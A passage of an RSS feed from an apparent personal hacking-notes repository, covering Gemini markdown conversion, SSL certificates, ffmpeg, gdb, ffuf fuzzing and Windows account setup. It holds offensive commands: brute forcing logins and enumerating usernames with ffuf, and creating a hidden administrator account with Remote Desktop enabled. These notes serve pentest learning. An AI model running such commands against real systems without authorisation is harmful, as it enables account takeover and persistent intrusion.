&lt;span id=&quot;cb2-6&quot;&gt;&lt;a href=&quot;#cb2-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;An image follows.&lt;/span&gt;
&lt;span id=&quot;cb2-7&quot;&gt;&lt;a href=&quot;#cb2-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-8&quot;&gt;&lt;a href=&quot;#cb2-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;al&quot;&gt;![This is some image alt-text](../02779186c69ce442260bd67d3bd11b3e.webp)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then md2gmn will output:&lt;/p&gt;&lt;pre class=&quot;gemini&quot;&gt;&lt;code&gt;This is a sentence.

=&amp;gt; https://necopinus.xyz necopinus.xyz
=&amp;gt; https://cardboard-iguana.com Cardboard Iguana Security

An image follows.

=&amp;gt; ../02779186c69ce442260bd67d3bd11b3e.webp This is some image alt-text
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Incidentally, this gives good guidance as to how to write image alt-text - alt-text should be thought of as the &lt;em&gt;linked text&lt;/em&gt; for the image.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/tdemin/gmnhg&quot;&gt;tdemin / gmnhg&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 12 Apr 2023 02:58:39 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Gemini%20Compatible%20Markdown.md</guid>
		</item>
		<item>
			<title>Get an SSL Certificate</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Get%20an%20SSL%20Certificate.md</link>
			<description>&lt;h2 id=&quot;self-signed&quot;&gt;Self-Signed&lt;/h2&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;openssl&lt;/span&gt; req -x509 -nodes -days 3650 -newkey rsa:4096 &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;            &lt;span class=&quot;ex&quot;&gt;-out&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$SITE&lt;/span&gt;.crt -keyout &lt;span class=&quot;va&quot;&gt;$SITE&lt;/span&gt;.key&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&quot;from-a-real-registrar&quot;&gt;From a Real Registrar&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; Now that &lt;a href=&quot;https://letsencrypt.org/&quot;&gt;Let's Encrypt&lt;/a&gt; exists, the below information is a lot less usefulâ¦&lt;/p&gt;&lt;p&gt;Generate a unique site key:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb2-1&quot;&gt;&lt;a href=&quot;#cb2-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;openssl&lt;/span&gt; genrsa -out &lt;span class=&quot;va&quot;&gt;$SITE&lt;/span&gt;.key 4096&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Generate a certificate signing request:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb3&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb3-1&quot;&gt;&lt;a href=&quot;#cb3-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;openssl&lt;/span&gt; req -new -config &lt;span class=&quot;va&quot;&gt;$SITE&lt;/span&gt;.cnf &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-2&quot;&gt;&lt;a href=&quot;#cb3-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;            &lt;span class=&quot;ex&quot;&gt;-key&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$SITE&lt;/span&gt;.key -out &lt;span class=&quot;va&quot;&gt;$SITE&lt;/span&gt;.csr&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
			<pubDate>Wed, 12 Apr 2023 02:58:39 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Get%20an%20SSL%20Certificate.md</guid>
		</item>
		<item>
			<title>Using "ffmpeg"</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20%22ffmpeg%22.md</link>
			<description>&lt;h2 id=&quot;m4a-to-mp3&quot;&gt;M4A to MP3&lt;/h2&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;ffmpeg&lt;/span&gt; -i &lt;span class=&quot;va&quot;&gt;${INPUT}&lt;/span&gt;.m4a -c:v copy -c:a libmp3lame &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;       &lt;span class=&quot;ex&quot;&gt;-q&lt;/span&gt;:a 0 &lt;span class=&quot;va&quot;&gt;${OUTPUT}&lt;/span&gt;.mp3&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The &lt;code&gt;-q:a&lt;/code&gt; parameters correspond to LAME's &lt;code&gt;-V&lt;/code&gt; option, so 0 is the highest quality and 9 is the lowest quality. While everyone says to use 3 or 4 for this parameter, in my experience even using 0 will often result in a &lt;em&gt;smaller&lt;/em&gt; file than an m4a original. (What's up with that? I thought that m4a was supposed to be more efficient than mp3?)&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://superuser.com/a/704535&quot;&gt;FFMPEG: Convert m4a to mp3 without significant loss&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://trac.ffmpeg.org/wiki/Encode/MP3&quot;&gt;FFmpeg MP3 Encoding Guide&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;mp4-to-gif&quot;&gt;MP4 to GIF&lt;/h2&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb2-1&quot;&gt;&lt;a href=&quot;#cb2-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Generate an optimized palette.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-2&quot;&gt;&lt;a href=&quot;#cb2-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-3&quot;&gt;&lt;a href=&quot;#cb2-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;ffmpeg&lt;/span&gt; -i &lt;span class=&quot;va&quot;&gt;$INPUT&lt;/span&gt;.mp4 &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-4&quot;&gt;&lt;a href=&quot;#cb2-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;       &lt;span class=&quot;ex&quot;&gt;-filter_complex&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;[0:v] palettegen&amp;quot;&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$PALETTE&lt;/span&gt;.png&lt;/span&gt;
&lt;span id=&quot;cb2-5&quot;&gt;&lt;a href=&quot;#cb2-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-6&quot;&gt;&lt;a href=&quot;#cb2-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Convert the MP4 to GIF (using the palette above).&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-7&quot;&gt;&lt;a href=&quot;#cb2-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-8&quot;&gt;&lt;a href=&quot;#cb2-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;ffmpeg&lt;/span&gt; -i &lt;span class=&quot;va&quot;&gt;$INPUT&lt;/span&gt;.mp4 -i &lt;span class=&quot;va&quot;&gt;$PALETTE&lt;/span&gt;.png &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-9&quot;&gt;&lt;a href=&quot;#cb2-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;       &lt;span class=&quot;ex&quot;&gt;-filter_complex&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;[0:v][1:v] paletteuse&amp;quot;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-10&quot;&gt;&lt;a href=&quot;#cb2-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;                        &lt;span class=&quot;va&quot;&gt;$OUTPUT&lt;/span&gt;&lt;span class=&quot;ex&quot;&gt;.gif&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://homehack.nl/create-animated-gifs-from-mp4-with-ffmpeg/&quot;&gt;Create animated GIFs from MP4 with FFmpeg&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;mp4-to-webp&quot;&gt;MP4 to WebP&lt;/h2&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb3&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb3-1&quot;&gt;&lt;a href=&quot;#cb3-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;ffmpeg&lt;/span&gt; -i &lt;span class=&quot;va&quot;&gt;$INPUT&lt;/span&gt;.mp4 &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-2&quot;&gt;&lt;a href=&quot;#cb3-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;       &lt;span class=&quot;ex&quot;&gt;-vf&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;fps=10,scale=720:-1:flags=lanczos&amp;quot;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-3&quot;&gt;&lt;a href=&quot;#cb3-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;       &lt;span class=&quot;ex&quot;&gt;-vcodec&lt;/span&gt; libwebp -lossless 0 -compression_level 6 &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-4&quot;&gt;&lt;a href=&quot;#cb3-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;       &lt;span class=&quot;ex&quot;&gt;-q&lt;/span&gt;:v 50 -loop 0 -preset picture -an &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-5&quot;&gt;&lt;a href=&quot;#cb3-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;       &lt;span class=&quot;ex&quot;&gt;-vsync&lt;/span&gt; 0 &lt;span class=&quot;va&quot;&gt;$OUTPUT&lt;/span&gt;.webp&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://mattj.io/posts/2021-02-27-create-animated-gif-and-webp-from-videos-using-ffmpeg/&quot;&gt;Create animated GIF and WebP from videos using FFmpeg&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 12 Apr 2023 02:58:39 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20%22ffmpeg%22.md</guid>
		</item>
		<item>
			<title>Using "fuff"</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20%22fuff%22.md</link>
			<description>&lt;p&gt;A general web fuzzing tool. Use &lt;code&gt;FUZZ&lt;/code&gt; as your placeholder.&lt;/p&gt;&lt;h2 id=&quot;directoryfile-enumeration&quot;&gt;Directory/File Enumeration&lt;/h2&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;ffuf&lt;/span&gt; -w /usr/share/wordlists/dirb/common.txt &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;     &lt;span class=&quot;ex&quot;&gt;-u&lt;/span&gt; https://&lt;span class=&quot;va&quot;&gt;$DOMAIN&lt;/span&gt;/FUZZ&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&quot;brute-force-virtual-hosts&quot;&gt;Brute Force Virtual Hosts&lt;/h2&gt;&lt;p&gt;Ffuf can fuzz HTTP headers, which can be used to try to brute force virtual host entries.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb2-1&quot;&gt;&lt;a href=&quot;#cb2-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;ffuf&lt;/span&gt; -w /usr/share/wordlists/metasploit/namelist.txt &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-2&quot;&gt;&lt;a href=&quot;#cb2-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;     &lt;span class=&quot;ex&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;Host: FUZZ.&lt;/span&gt;&lt;span class=&quot;va&quot;&gt;$DOMAIN&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-3&quot;&gt;&lt;a href=&quot;#cb2-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;     &lt;span class=&quot;ex&quot;&gt;-u&lt;/span&gt; https://&lt;span class=&quot;va&quot;&gt;$IP&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Use &lt;code&gt;-fs $SIZE&lt;/code&gt; to remove results of a particular size from the list (which you'll probably need to do when trying to brute force virtual hosted subdomains).&lt;/p&gt;&lt;h2 id=&quot;username-enumeration&quot;&gt;Username Enumeration&lt;/h2&gt;&lt;p&gt;Assuming that our login or password reset form isn't AJAX-y:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb3&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb3-1&quot;&gt;&lt;a href=&quot;#cb3-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;ffuf&lt;/span&gt; -w /usr/share/wordlists/wfuzz/others/names.txt &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-2&quot;&gt;&lt;a href=&quot;#cb3-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;     &lt;span class=&quot;ex&quot;&gt;-X&lt;/span&gt; POST -d &lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;va&quot;&gt;$POST_VARS&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-3&quot;&gt;&lt;a href=&quot;#cb3-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;     &lt;span class=&quot;ex&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;Content-Type: application/x-www-form-urlencoded&amp;quot;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-4&quot;&gt;&lt;a href=&quot;#cb3-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;     &lt;span class=&quot;ex&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$FORM_URL&lt;/span&gt; -mr &lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;va&quot;&gt;$ERROR_MEESAGE_SUBSTRING&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt; -s&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Here &lt;code&gt;$POST_VARS&lt;/code&gt; should look something like &lt;code&gt;username=FUZZ&amp;amp;email=FUZZ@example.com&amp;amp;password=1234&amp;amp;cpassword=1234&lt;/code&gt;. The &lt;code&gt;-mr&lt;/code&gt; flag instructs ffuf to filter on page text for a &quot;successful hit&quot;; &lt;code&gt;-s&lt;/code&gt; supresses all output except successful fuzzes (as defined by &lt;code&gt;-mr&lt;/code&gt;).&lt;/p&gt;&lt;h2 id=&quot;brute-force-login-credentials&quot;&gt;Brute Force Login Credentials&lt;/h2&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb4&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb4-1&quot;&gt;&lt;a href=&quot;#cb4-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;ffuf&lt;/span&gt; -w /usr/share/wordlists/wfuzz/others/names.txt:W1,&lt;span class=&quot;va&quot;&gt;$HOME&lt;/span&gt;/.local/share/red-team/wordlists/rockyou.txt:W2 &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-2&quot;&gt;&lt;a href=&quot;#cb4-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;     &lt;span class=&quot;ex&quot;&gt;-X&lt;/span&gt; POST -d &lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;va&quot;&gt;$POST_VARS&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-3&quot;&gt;&lt;a href=&quot;#cb4-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;     &lt;span class=&quot;ex&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;Content-Type: application/x-www-form-urlencoded&amp;quot;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-4&quot;&gt;&lt;a href=&quot;#cb4-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;     &lt;span class=&quot;ex&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$LOGIN_URL&lt;/span&gt; -fc 200 -s&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Here we assign W1 and W2 to take terms from the two supplied wordlists; &lt;code&gt;$POST_VARS&lt;/code&gt; then looks something like &lt;code&gt;username=W1&amp;amp;password=W2&lt;/code&gt;. This example assumes that a successful login will return an HTTP status code &lt;em&gt;other&lt;/em&gt; than 200 (probably a 301 or 302); &lt;code&gt;-s&lt;/code&gt; supresses all output except successful fuzzes (the inverse of &lt;code&gt;-fc&lt;/code&gt;).&lt;/p&gt;&lt;p&gt;Note that ffuf will try every possible combination of elements between the two wordlists, which means that the number of combinations tried grows geometrically. So you probably &lt;em&gt;don't&lt;/em&gt; want to try the above example directly, but rather generate a shorter user list first via enumeration (see the previous section).&lt;/p&gt;</description>
			<pubDate>Wed, 12 Apr 2023 02:58:39 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20%22fuff%22.md</guid>
		</item>
		<item>
			<title>Using âgdbâ</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20%22gdb%22.md</link>
			<description>&lt;h2 id=&quot;startup&quot;&gt;Startup&lt;/h2&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;gdb&lt;/span&gt;                   # Run&lt;span class=&quot;kw&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;ex&quot;&gt;use&lt;/span&gt; file command to load &lt;span class=&quot;va&quot;&gt;$OBJECT&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;gdb&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$OBJECT&lt;/span&gt;           # Debug &lt;span class=&quot;va&quot;&gt;$OBJECT&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-3&quot;&gt;&lt;a href=&quot;#cb1-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;gdb&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$OBJECT&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$COREDUMP&lt;/span&gt; &lt;span class=&quot;co&quot;&gt;# Analyze $COREDUMP&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-4&quot;&gt;&lt;a href=&quot;#cb1-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;gdb&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$OBJECT&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$PID&lt;/span&gt;      # Attach to running process &lt;span class=&quot;va&quot;&gt;$PID&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&quot;general-commands&quot;&gt;General Commands&lt;/h2&gt;&lt;pre class=&quot;gdb&quot;&gt;&lt;code&gt;set args                     # Set program arguments
show args                    # Show program arguments
run                          # Run the program
run &amp;lt; file                   # Run with input from file
set follow-exec-mode new/sam # Set debugger response to exec
set write                    # Set write into executables
set write off                # Unset write int oexecutables 
continue                     # Continue running until break
finish                       # Exec until current frame ends
source FILE                  # Read commands from script file
shell [cmd]                  # Run cmd in a shell
display /5i $eip             # Display $eip at execution end
undisplay &amp;lt;expr #&amp;gt;           # Undisplay expression number
info functions               # List all the functions
info variables               # List all the variables
info registers               # List most common registers
info all-registers           # List all registers
info display                 # List of displayed expressions
backtrace                    # Backtrace of all stack frames
where                        # Same as backtrace
set disassembly-flavor intel # Disassembly style to intel/att
define hook-[cmd]            # Action before command
define hooopost-[cmd]        # Action after command
define hook-stop             # Action when execution stops
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;breakpoints&quot;&gt;Breakpoints&lt;/h2&gt;&lt;pre class=&quot;gdb&quot;&gt;&lt;code&gt;info breakpoints              # List all breakpoints
break [func]                  # Break function name
break *[addr]                 # Break at address
delete [bnum]                 # Delete breakpoint bnum
break if [cond]               # Break if condition
ignore [bnum] [count]         # Ignore breakpoint count times
condition [bnum] $eax == 0x22 # Add condition for breakpoint
condition [bnum]              # Del condition for breakpoint
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;watchpoints&quot;&gt;Watchpoints&lt;/h2&gt;&lt;pre class=&quot;gdb&quot;&gt;&lt;code&gt;info watchpoints         # List all the watchpoint
watch variable==value    # Break when variable equals ...
watch $eax == 0x0000ffaa # Break when register equals ...
rwatch *[addr]           # Break on read memory location
awatch *[addr]           # Break on read/write memory location
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/slyth11907/Cheatsheets&quot;&gt;slyth11907 / Cheatsheets&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 12 Apr 2023 02:58:39 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20%22gdb%22.md</guid>
		</item>
		<item>
			<title>How to Add Windows Users (at the Command Line)</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/How%20to%20Add%20Windows%20Users%20%28at%20the%20Command%20Line%29.md</link>
			<description>&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode powershell&quot;&gt;&lt;code class=&quot;sourceCode powershell&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;net user &lt;span class=&quot;va&quot;&gt;$USERNAME&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$PASSWORD&lt;/span&gt; /add&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;net localgroup Administrators &lt;span class=&quot;va&quot;&gt;$USER&lt;/span&gt; /add&lt;/span&gt;
&lt;span id=&quot;cb1-3&quot;&gt;&lt;a href=&quot;#cb1-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;net localgroup &lt;span class=&quot;st&quot;&gt;&amp;quot;Remote Desktop Users&amp;quot;&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$USER&lt;/span&gt; /add&lt;/span&gt;
&lt;span id=&quot;cb1-4&quot;&gt;&lt;a href=&quot;#cb1-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;reg add `&lt;/span&gt;
&lt;span id=&quot;cb1-5&quot;&gt;&lt;a href=&quot;#cb1-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;st&quot;&gt;&amp;quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&amp;quot;&lt;/span&gt; `&lt;/span&gt;
&lt;span id=&quot;cb1-6&quot;&gt;&lt;a href=&quot;#cb1-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    /v fDenyTSConnections /t REG_DWORD /d 0 /f&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This requires SYSTEM privileges or a (local) administrator account.&lt;/p&gt;&lt;p&gt;It's worth noting that users added via &lt;code&gt;net user&lt;/code&gt; seem to bypass Windows' password policiesâ¦&lt;/p&gt;&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/path/outline/beginner&quot;&gt;TryHackMe: Complete Beginner&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=Zma6Mk5bEI8&quot;&gt;Alice with Siddicky (Student Mentor) (YouTube)&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
